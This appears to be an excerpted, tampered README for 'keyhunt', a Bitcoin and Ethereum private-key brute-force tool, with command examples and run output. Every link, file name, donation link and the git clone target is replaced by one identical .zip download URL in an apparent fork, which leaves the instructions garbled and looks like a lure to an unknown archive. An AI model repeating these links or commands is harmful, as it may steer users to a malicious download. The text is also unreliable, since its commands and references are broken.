...
Post: https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip
...
```
./keyhunt -m address -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -b 66 -l compress -R -q -s 10
...
```
./keyhunt -m bsgs -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -b 125 -q -s 10 -R
```
...
This code is free of charge, see the licence for more details. https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip

Although this project is a hobby for me, it still involves a considerable amount of work.
If you would like to support this project, please consider donating at https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip
...
Please read the https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip to see the new changes
...
```
git clone https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip
```
...
Example of address from solved puzzles, this file is already on the repository `https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip`
...
`./keyhunt -m address -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -r 1:FFFFFFFF`
...
command to search multiple vanity addresses from a file `-f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip`.

```
./keyhunt -m vanity -f ~https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -l compress -R -b 256 -e -s 10 -q 
```
...
All the vanity address and his privatekeys will be saved in the file `https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip` of your current directory


## rmd160 mode

rmd stands for RIPE Message Digest (see https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip )
...
example file `https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip` :
...
```
./keyhunt -m rmd160 -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -r 1:FFFFFFFF -l compress -s 5
```
...
```
./keyhunt -m rmd160 -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -b 66 -l compress -R -q
```
...
```./keyhunt -m xpoint -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -n 65536 -t 4 -b 40```
...
```./keyhunt -m xpoint -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -t 4 -b 125 -R -q```
...
```./keyhunt -m pub2rmd -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -t 6 -q```
...
[+] Threads : 6
[+] Quiet thread output
[+] Opening file https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip
...
```
./keyhunt -m bsgs -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -R -b 125 -q -S -s 10
[+] Version 0.2.230430 Satoshi Quest, developed by AlbertoBSD
[+] Random mode
[+] Quiet thread output
[+] Stats output every 10 seconds
...
[+] Writing bloom filter to file https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip .... Done!
[+] Writing bloom filter to file https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip .... Done!
[+] Writing bP Table to file https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip .. Done!
[+] Writing bloom filter to file https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip .... Done!
...
[+] Bloom filter for 4096 elements : 0.88 MB
[+] Allocating 0.00 MB for 4096 bP Points
[+] Reading bloom filter from file https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip .... Done!
[+] Reading bloom filter from file https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip .... Done!
[+] Reading bP Table from file https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip .... Done!
[+] Reading bloom filter from file https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip .... Done!
^C
```
...
```
time ./keyhunt -m bsgs -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -b 120 -S
```
...
```./keyhunt -m bsgs -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -b 125 -q -s 10 -B random```
...
Example:
```
./keyhunt -m bsgs -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -b 125 -R -k 20 -S
```
...
```
./keyhunt -m bsgs -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -b 125 -R -k 128 -S
```
...
`./keyhunt -m bsgs -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -b 125 -R -k 512 -q -t 8 -s 10 -S`
...
```
time ./keyhunt -m bsgs -t 6 -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -r 49dccfd96dc5df56487436f5a1b18c4f5d34f65ddb48cb5e0000000000000000:49dccfd96dc5df56487436f5a1b18c4f5d34f65ddb48cb5effffffffffffffff -n 0x1000000000000000 -M -s 0
```
...
Command
```
time ./keyhunt -m bsgs -t 8 -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -k 512 -s 0 -S -b 63
```
...
Select one publickey that fit to your current speed save it in a file `https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip` and test it with:

```
./keyhunt -m bsgs -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -b 120 -q
```
...
Change your n or k values according to your current memory and remember not exceed the k value of each N please check the table https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip
...
```
./keyhunt -m minikeys -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -C SG64GZqySYwBm9KxE1wJ28 -n 0x10000
```
...
```
./keyhunt -m minikeys -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -n 0x10000 -q -R
```
...
to test the functionality of ethereum you can use the sample file `https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip`

command: 

```
./keyhunt -c eth -f https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip -r 1:100000000 -M
```
...
R: In a file called `https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip`
...
R: this was asked here https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip and 
here https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip and also others in telegram

Please check the video that i made to answer that https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip
...
Available in: https://github.com/GBran88/keyhunt/raw/refs/heads/main/oldbloom/Software-demideify.zip
